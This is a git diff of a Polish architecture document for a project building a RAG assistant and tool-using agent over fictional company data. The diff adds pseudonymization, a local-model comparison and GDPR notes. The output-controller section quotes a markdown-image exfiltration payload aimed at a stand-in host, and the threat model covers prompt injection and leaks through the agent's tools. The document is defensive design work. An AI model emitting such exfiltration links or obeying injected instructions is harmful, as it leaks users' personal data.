@@ -1,15 +1,17 @@
-# Architektura: Kto pilnuje agenta?
+# Architektura: Asystent AI na danych wrażliwych
 
-Dokument techniczny dla zespołu. Wersja skrócona do prezentacji: `kto-pilnuje-agenta.md`.
+Dokument techniczny dla zespołu. Wersja skrócona do prezentacji: `kto-pilnuje-agenta.md`. Projekt łączy dwa wątki: ochronę danych (Bartek) i kontrolę agenta (Łukasz).
 
 ## 1. Cel i zakres
 
-Budujemy asystenta AI (RAG + agent z narzędziami) na fikcyjnych dokumentach firmy i mierzymy, jak kolejne warstwy kontroli wpływają na:
-- **szczelność**: odsetek udanych ataków,
+Budujemy asystenta AI (RAG + agent z narzędziami) na fikcyjnych dokumentach firmy i mierzymy, jak kolejne warstwy ochrony prywatności i kontroli agenta wpływają na:
+- **szczelność**: odsetek udanych ataków i ilość danych osobowych wysłanych do dostawcy modelu,
 - **jakość**: poprawność odpowiedzi,
 - **koszt i opóźnienie**.
 
-**W zakresie:** tożsamość agenta, delegacja uprawnień, reguły dostępu do narzędzi, kontrola wyjścia, audyt, przegląd uprawnień agenta.
+**Pytanie badawcze:** ile jakości i kosztu kosztuje każdy poziom ochrony?
+
+**W zakresie:** tożsamość agenta, delegacja uprawnień, uprawnienia na poziomie dokumentów, reguły dostępu do narzędzi, pseudonimizacja danych przed modelem zewnętrznym, model lokalny, kontrola wyjścia, wykrywanie danych osobowych w języku polskim, audyt, przegląd uprawnień agenta, aspekt RODO.
 
 **Poza zakresem:** atak na hosta lub kontenery, zatruwanie modelu, DoS, złośliwy administrator, prawdziwe dane osobowe.
 
@@ -38,6 +40,7 @@ flowchart TB
     subgraph APP[Strefa aplikacji - Docker]
         AG[agent-api<br/>Python, pętla agenta]
         TG[tool-gateway<br/>wykonuje narzędzia]
+        PS[pseudonymizer<br/>Presidio + sejf pseudonimów]
         OC[output-controller<br/>Presidio + reguły]
         OPA[OPA<br/>reguły dostępu]
     end
@@ -58,7 +61,10 @@ flowchart TB
 
     UI -->|OIDC login| KC
     UI -->|pytanie + token| AG
-    AG -->|prompt| GEM
+    AG -->|tekst do pseudonimizacji / detokenizacji| PS
+    PS -->|szyfrowanie mapowania| VA
+    PS -->|mapowanie tokenów, RLS| PG
+    AG -->|prompt z tokenami| GEM
     AG -->|wywołanie narzędzia + token| TG
     TG -->|decyzja?| OPA
     TG -->|krótkotrwałe hasło| VA
@@ -74,12 +80,12 @@ flowchart TB
 | Granica | Co ją przekracza | Ryzyko |
 |---|---|---|
 | Użytkownik → aplikacja | pytanie, token | prompt injection, podszywanie się |
-| Aplikacja → Gemini | prompt z fragmentami dokumentów | dane opuszczają organizację |
+| Aplikacja → Gemini | prompt z fragmentami dokumentów | dane opuszczają organizację (kontrola: pseudonimizacja albo model lokalny) |
 | Agent → narzędzia | decyzja modelu o wywołaniu | nadmierna sprawczość, confused deputy |
 | Narzędzia → baza | zapytanie SQL | dostęp ponad uprawnienia |
 | Aplikacja → użytkownik | odpowiedź | ujawnienie danych, eksfiltracja przez linki |
 
-**Kluczowa zasada:** model AI nigdy nie decyduje o uprawnieniach. Decyzje dostępowe zapadają poza modelem (OPA, RLS, kontroler wyjścia), więc nie da się ich „przegadać”.
+**Kluczowa zasada:** model AI nigdy nie decyduje o uprawnieniach. Decyzje dostępowe zapadają poza modelem (OPA, RLS, kontroler wyjścia), więc nie da się ich „przegadać”. To samo dotyczy detokenizacji: o tym, czy pseudonim wróci do postaci jawnej, decyduje RLS na sejfie, a nie model.
 
 ## 4. Przebieg jednego pytania
 
@@ -89,6 +95,7 @@ sequenceDiagram
     participant KC as Keycloak
     participant AG as agent-api
     participant GM as Gemini
+    participant PS as pseudonymizer
     participant TG as tool-gateway
     participant OPA as OPA
     participant VA as Vault
@@ -100,7 +107,9 @@ sequenceDiagram
     U->>AG: pytanie + token
     AG->>KC: token exchange: agent w imieniu użytkownika
     KC-->>AG: token delegowany (sub=użytkownik, act=agent)
-    AG->>GM: pytanie + opis narzędzi
+    AG->>PS: pseudonimizuj pytanie
+    PS-->>AG: pytanie z tokenami
+    AG->>GM: pytanie z tokenami + opis narzędzi
     GM-->>AG: wywołaj szukaj_dokumentow("...")
     AG->>TG: wywołanie + token delegowany
     TG->>OPA: input {użytkownik, rola, agent, narzędzie, zasób}
@@ -110,8 +119,12 @@ sequenceDiagram
     PG-->>TG: fragmenty dokumentów
     TG->>PG: zapis zdarzenia audytu
     TG-->>AG: wynik narzędzia
-    AG->>GM: wynik + kontekst
-    GM-->>AG: szkic odpowiedzi
+    AG->>PS: pseudonimizuj wynik
+    PS-->>AG: wynik z tokenami
+    AG->>GM: wynik z tokenami + kontekst
+    GM-->>AG: szkic odpowiedzi (z tokenami)
+    AG->>PS: detokenizuj szkic + token użytkownika
+    PS-->>AG: szkic jawny (tylko dozwolone wartości)
     AG->>OC: szkic + id użytych dokumentów + token
     OC-->>AG: OK / zablokuj / zamaskuj
     AG-->>U: odpowiedź
@@ -183,7 +196,7 @@ allow if {
 ### 5.5 Sekrety (Vault)
 - **KV:** klucz Gemini API (każdy wgrywa swój, nigdy nie trafia do Gita).
 - **Database secrets engine:** `tool-gateway` dostaje krótkotrwałe konto do Postgresa (TTL 15 min). Nie ma stałego hasła w konfiguracji.
-- **Transit:** szyfrowanie tabeli mapowania pseudonimów (część Bartka).
+- **Transit:** szyfrowanie tabeli mapowania pseudonimów (sekcja 5.10).
 - Do zastanowienia: Vault ma licencję BSL 1.1 (darmowy, ale nie open source). Zamiennik open source z tym samym API to OpenBao.
 
 ### 5.6 Baza (PostgreSQL + pgvector + RLS)
@@ -203,8 +216,8 @@ CREATE POLICY chunks_by_role ON doc_chunks
     ));
 ```
 
-### 5.7 Kontroler wyjścia
-Deterministyczny, bez LLM. Sprawdza trzy rzeczy:
+### 5.7 Kontroler wyjścia (guardrails)
+Deterministyczny, bez LLM. Działa na tekście po detokenizacji, czyli na tym, co naprawdę zobaczy użytkownik. Sprawdza trzy rzeczy:
 1. **Źródła:** czy wszystkie dokumenty użyte w odpowiedzi są dozwolone dla pytającego.
 2. **Dane osobowe:** Presidio z własnymi recognizerami PESEL (z sumą kontrolną) i NIP; maskowanie lub blokada.
 3. **Eksfiltracja:** blokada linków i obrazków markdown spoza listy dozwolonych domen (typowy kanał wycieku: `![](https://zly.pl/?d=DANE)`).
@@ -245,30 +258,60 @@ CREATE TABLE audit_events (
   - zgadywanie id dokumentów.
 - **Sędzia:** LLM-as-judge (Gemini Flash) ocenia jakość względem wzorcowych odpowiedzi. Wyciek ocenia regułowo: czy w odpowiedzi pojawił się „kanarek”, czyli unikalny znacznik wstawiony do dokumentów poufnych. Dzięki temu wynik nie zależy od opinii modelu.
 
+### 5.10 Pseudonimizacja i sejf pseudonimów
+Cel: dane osobowe nie trafiają do zewnętrznego modelu, a odpowiedź dla uprawnionego użytkownika nadal jest pełna.
+
+- **Wykrywanie:** Presidio z własnymi recognizerami PESEL (z sumą kontrolną) i NIP oraz obsługą polskiej odmiany nazwisk („Kowalski”, „Kowalskiego”, „Kowalskiemu” to ta sama osoba i ten sam token).
+- **Tokenizacja:** każda wykryta wartość dostaje stały token w obrębie dokumentu, np. `<OSOBA_017>`, `<PESEL_004>`. Tokenizowane są pytanie, fragmenty dokumentów i wyniki narzędzi, czyli wszystko, co idzie do modelu.
+- **Sejf:** tabela mapowania w Postgresie. Wartości jawne są szyfrowane przez Vault Transit, więc sam dostęp do bazy nie wystarcza do odczytu.
+- **Detokenizacja z uprawnieniami:** na wyjściu token wraca do wartości jawnej tylko wtedy, gdy pytający ma prawo do dokumentu, z którego wartość pochodzi. Pilnuje tego RLS na tabeli mapowania (ta sama klasyfikacja co fragment dokumentu). Pozostałe tokeny zostają w odpowiedzi jako tokeny.
+- **Model lokalny:** przy Ollamie pseudonimizacja nie jest potrzebna do ochrony przed dostawcą, ale porównujemy oba warianty, żeby zmierzyć, ile jakości zabiera sama tokenizacja.
+
+```sql
+-- Pseudonym vault: plaintext encrypted by Vault Transit, filtered by RLS
+CREATE TABLE pseudonym_map (
+    token           TEXT PRIMARY KEY,      -- e.g. <OSOBA_017>
+    entity_type     TEXT NOT NULL,         -- PERSON / PESEL / NIP / EMAIL ...
+    ciphertext      TEXT NOT NULL,         -- vault:v1:...
+    source_doc_id   TEXT NOT NULL,
+    classification  TEXT NOT NULL
+);
+ALTER TABLE pseudonym_map ENABLE ROW LEVEL SECURITY;
+```
+
 ## 6. Dane testowe
 - Fikcyjna firma, dokumenty wygenerowane LLM-em: zgłoszenia serwisowe, notatki HR, maile, umowy.
 - Klasyfikacje: `public`, `internal`, `hr_confidential`, `contract_confidential`.
 - W dokumentach poufnych są **kanarki** (np. `KANAREK-HR-0042`) do automatycznego wykrywania wycieków.
 - Fikcyjne, ale poprawne formalnie PESEL i NIP do testowania Presidio.
+- Nazwiska w różnych przypadkach (odmiana) i w różnych formach zapisu, żeby sprawdzić wykrywanie po polsku.
+- Oznaczony ręcznie zbiór fragmentów z zaznaczonymi danymi osobowymi do liczenia precision i recall Presidio.
 - Zestaw 30–50 pytań z wzorcowymi odpowiedziami, przypisanych do ról.
 
 ## 7. Warianty do porównania
 
-| Wariant | Delegacja + RLS | OPA na narzędziach | Kontroler wyjścia | Akceptacja maili |
-|---|---|---|---|---|
-| V0 Baseline | – | – | – | – |
-| V1 Tożsamość | ✔ | – | – | – |
-| V2 Reguły | ✔ | ✔ | – | – |
-| V3 Kontrola wyjścia | ✔ | ✔ | ✔ | – |
-| V4 Człowiek w pętli | ✔ | ✔ | ✔ | ✔ |
+Warianty są kumulatywne: każdy dokłada jedną warstwę do poprzedniego.
 
-Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełączamy zmiennymi (Ansible / `.env`), a kod pozostaje ten sam.
+| Wariant | Delegacja + RLS (uprawnienia do dokumentów) | OPA na narzędziach | Pseudonimizacja | Kontroler wyjścia | Akceptacja maili |
+|---|---|---|---|---|---|
+| V0 Baseline | – | – | – | – | – |
+| V1 Tożsamość | ✔ | – | – | – | – |
+| V2 Reguły | ✔ | ✔ | – | – | – |
+| V3 Pseudonimizacja | ✔ | ✔ | ✔ | – | – |
+| V4 Kontrola wyjścia | ✔ | ✔ | ✔ | ✔ | – |
+| V5 Człowiek w pętli | ✔ | ✔ | ✔ | ✔ | ✔ |
+
+**Oś modelu:** każdy wariant da się uruchomić na Gemini Flash albo na Ollamie. Minimum do tabeli: V0, V2 i V4 na obu modelach (V2 na Ollamie odpowiada „modelowi lokalnemu bez pseudonimizacji”).
+
+Dodatkowo: V4 przed przeglądem uprawnień agenta i po nim. Warianty i model przełączamy zmiennymi (Ansible / `.env`), a kod pozostaje ten sam.
 
 ## 8. Metryki
 
 | Metryka | Jak liczymy |
 |---|---|
 | Skuteczność ataków | % scenariuszy, w których kanarek trafił do odpowiedzi lub mail wyszedł poza domenę |
+| Wyciek do dostawcy | liczba danych osobowych i kanarków w promptach wysłanych do zewnętrznego API (z logów Langfuse) |
+| Wykrywanie danych osobowych | precision / recall Presidio na oznaczonym polskim zbiorze, osobno dla odmienionych nazwisk |
 | Skuteczność kontrolera | precision / recall blokad na oznaczonym zbiorze |
 | Fałszywe blokady | % poprawnych odpowiedzi zablokowanych dla uprawnionego użytkownika |
 | Jakość | ocena sędziego 1–5 + ręczna weryfikacja próbki |
@@ -281,12 +324,18 @@ Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełącza
 | Zagrożenie | Gdzie | Kontrola |
 |---|---|---|
 | LLM01 Prompt Injection (bezpośredni i pośredni) | pytanie, dokumenty | decyzje poza modelem: OPA, RLS, kontroler |
-| LLM02 Sensitive Information Disclosure | odpowiedź | RLS, kontroler wyjścia, kanarki |
+| LLM02 Sensitive Information Disclosure | odpowiedź, prompt do dostawcy | RLS, pseudonimizacja, model lokalny, kontroler wyjścia, kanarki |
 | LLM06 Excessive Agency | narzędzia | minimalny zestaw narzędzi, OPA, akceptacja człowieka |
 | LLM07 System Prompt Leakage | prompt | brak sekretów i reguł dostępu w prompcie |
 | LLM08 Vector and Embedding Weaknesses | wyszukiwanie | RLS na fragmentach, filtrowanie przed wyszukiwaniem |
 
 Świadomie nie obejmujemy: kompromitacji hosta, złośliwego administratora, ataków na samego dostawcę modelu.
+
+### 9.1 RODO: pseudonimizacja to nie anonimizacja
+- Dane spseudonimizowane nadal są danymi osobowymi (RODO, art. 4 pkt 5 i motyw 26), bo ktoś ma klucz do ich odtworzenia, czyli nasz sejf.
+- Pseudonimizacja zmniejsza ryzyko przy wysyłce do dostawcy, ale nie zwalnia z obowiązków: podstawy prawnej, umowy powierzenia z dostawcą, minimalizacji danych.
+- Ograniczenia, które pokazujemy w pracy: Presidio nie wykryje wszystkiego (recall poniżej 100%), a kontekst bywa identyfikujący sam w sobie („jedyna kierowniczka działu kadr w Gdańsku”).
+- Wniosek do obrony: pseudonimizacja to warstwa ograniczająca ryzyko, a nie powód, żeby uznać dane za anonimowe.
 
 ## 10. Decyzje architektoniczne (ADR do napisania)
 
@@ -297,11 +346,15 @@ Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełącza
 5. Dwie linie obrony: OPA i RLS, choć wydają się dublować.
 6. Krótkotrwałe poświadczenia z Vaulta zamiast stałego hasła.
 7. Gemini Flash (darmowy plan) jako model główny, z konsekwencjami dla danych.
-8. Czysty Python zamiast n8n lub frameworka agentowego.
+8. Czysty Python zamiast n8n, LangChain, LlamaIndex lub frameworka agentowego.
+9. Pseudonimizacja przed wysłaniem do modelu zewnętrznego, z detokenizacją zależną od uprawnień pytającego.
+10. Sejf pseudonimów w Postgresie (szyfrowany przez Vault Transit) zamiast osobnej usługi.
+11. pgvector zamiast Qdranta: wektory, uprawnienia i RLS w jednej bazie.
+12. Pominięcie Databricks i SQL Server: na tę skalę tylko komplikują.
 
 ## 11. Wdrożenie
 
-- **Docker Compose:** postgres, vault, keycloak, opa, langfuse, ollama, mailpit, agent-api, tool-gateway, output-controller.
+- **Docker Compose:** postgres, vault, keycloak, opa, langfuse, ollama, mailpit, agent-api, tool-gateway, pseudonymizer, output-controller.
 - **Ansible** stawia całość na czystej VM z Ubuntu:
 
 | Rola | Zadanie |
@@ -311,7 +364,7 @@ Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełącza
 | `03_stack` | pliki Compose, `.env`, start usług |
 | `04_vault` | init, unseal, KV, database engine, transit |
 | `05_keycloak` | realm, role, użytkownicy testowi, klient agenta |
-| `06_data` | schemat, RLS, dokumenty, kanarki, embeddingi |
+| `06_data` | schemat, RLS, dokumenty, kanarki, embeddingi, sejf pseudonimów |
 | `07_opa` | wgranie polityk |
 
 - Nazwy tasków według konwencji `[NN.S.T]`, np. `[04.2.1] Enable database secrets engine`.
@@ -339,6 +392,7 @@ Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełącza
 ├── compose/docker-compose.yml
 ├── data/
 │   ├── generator/           # generowanie dokumentów
+│   ├── pii_labeled/         # oznaczony zbiór do oceny Presidio
 │   └── questions.yaml       # pytania testowe + wzorce
 ├── docs/
 │   ├── architektura.md
@@ -349,6 +403,7 @@ Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełącza
 ├── src/
 │   ├── agent_api/
 │   ├── tool_gateway/
+│   ├── pseudonymizer/       # Presidio PL, tokenizacja, sejf
 │   ├── output_controller/
 │   └── access_review/
 ├── eval/                    # uruchamianie wariantów, notebooki z wynikami
@@ -359,4 +414,4 @@ Dodatkowo: V3 przed przeglądem uprawnień agenta i po nim. Warianty przełącza
 
 - Wszystko jest darmowe. Wyjątki od open source: Vault (BSL 1.1, zamiennik OpenBao) i Gemini (darmowa usługa).
 - **Darmowy plan Gemini:** Google może wykorzystać przesyłane dane do ulepszania swoich produktów, a limity zapytań są niskie i liczone na projekt. Na fikcyjnych danych to nie problem. W pracy jest to argument, że w prawdziwej firmie potrzebny jest płatny plan albo model lokalny.
-- Ollama służy jako wariant porównawczy i zapas przy wyczerpaniu limitów.
+- Ollama to pełnoprawna oś porównania (dane nie opuszczają maszyny) i zapas przy wyczerpaniu limitów.
